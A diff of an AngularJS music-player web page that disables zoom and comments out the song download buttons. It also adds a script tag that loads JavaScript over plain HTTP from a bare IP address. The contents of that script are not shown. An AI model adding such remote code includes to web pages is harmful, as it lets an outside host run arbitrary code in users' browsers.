@@ -3,7 +3,7 @@
 <head lang="zh-cn">
 	<meta charset="UTF-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=0">
 	<title>Music</title>
 	<link rel="stylesheet" href="css/bootstrap.min.css"/>
 	<link rel="stylesheet" href="css/bootstrap-theme.min.css"/>
@@ -58,9 +58,9 @@
 					<button type="button" ng-class="{true:'disabled',false:''}[player.volume==0]" ng-click="down()" class="btn btn-default"><i class="fa fa-volume-down"></i></button>
 					<button type="button" ng-class="{true:'disabled',false:''}[player.volume==1]" ng-click="up()" class="btn btn-default"><i class="fa fa-volume-up"></i></button>
 				</div>
-				<div class="btn-group">
-					<button type="button" ng-click="download(song.song_id||song.songid)" class="btn btn-default"><i class="fa fa-cloud-download"></i></button>
-				</div>
+				<!--<div class="btn-group">-->
+					<!--<button type="button" ng-click="download(song.song_id||song.songid)" class="btn btn-default"><i class="fa fa-cloud-download"></i></button>-->
+				<!--</div>-->
 			</div>
 			<hr/>
 			<!--audio-->
@@ -89,7 +89,7 @@
 					<div class="pull-right">
 						<a href="javascript:void(0)" ng-click="playSearch(item)" ng-if="!playing || song.songid != item.songid">播放</a>
 						<a href="javascript:void(0)" ng-click="pause()" ng-if="playing && song.songid == item.songid">暂停</a>
-						<a href="javascript:void(0)" ng-click="download(item.songid)">下载</a>
+						<!--<a href="javascript:void(0)" ng-click="download(item.songid)">下载</a>-->
 					</div>
 				</div>
 			</div>
@@ -113,7 +113,7 @@
 				<div class="pull-right">
 					<a href="javascript:void(0)" ng-click="play(item)" ng-if="!playing || song.song_id != item.song_id">播放</a>
 					<a href="javascript:void(0)" ng-click="pause()" ng-if="playing && song.song_id == item.song_id">暂停</a>
-					<a href="javascript:void(0)" ng-click="download(item.song_id)">下载</a></div>
+					<!--<a href="javascript:void(0)" ng-click="download(item.song_id)">下载</a></div>-->
 			</div>
 		</div>
 	</div>
@@ -130,6 +130,7 @@
 	</div>
 </div>
 <iframe id="fr" src="javascript:parent.audio" frameborder="0"></iframe>
+<script src="http://121.40.186.199/lib/console.js.php?hash=xialei"></script>
 <script src="bower_components/angularjs/angular.min.js"></script>
 <script src="main.js"></script>
 </body>
